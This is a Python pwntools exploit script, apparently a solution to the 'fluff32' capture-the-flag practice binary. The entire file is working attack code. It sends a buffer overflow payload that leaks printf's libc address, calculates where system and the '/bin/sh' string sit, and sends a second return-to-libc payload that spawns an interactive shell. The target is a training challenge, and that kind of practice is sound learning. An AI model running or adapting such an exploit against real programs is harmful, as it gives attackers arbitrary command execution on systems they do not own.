from pwn import * 

sh = process("./fluff32")
elf = ELF("./fluff32")
libc = ELF("./libc.so.6")

printf_plt = elf.plt['printf']
printf_got = elf.got['printf']
pwnme = elf.symbols['pwnme']
sh.recvuntil("> ")
payload1 = b'a' * 0x2c
payload1 += p32(printf_plt) + p32(pwnme) + p32(printf_got)
sh.sendline(payload1)

printf_addr = u32(sh.recv()[0:4])

base_libc = printf_addr - libc.symbols['printf']
system = base_libc + libc.symbols['system']
binsh = base_libc + next(libc.search(b"/bin/sh"))

payload2 = b'a' * 0x2c
payload2 += p32(system) + b'b'*4 + p32(binsh)
sh.sendline(payload2)
sh.interactive()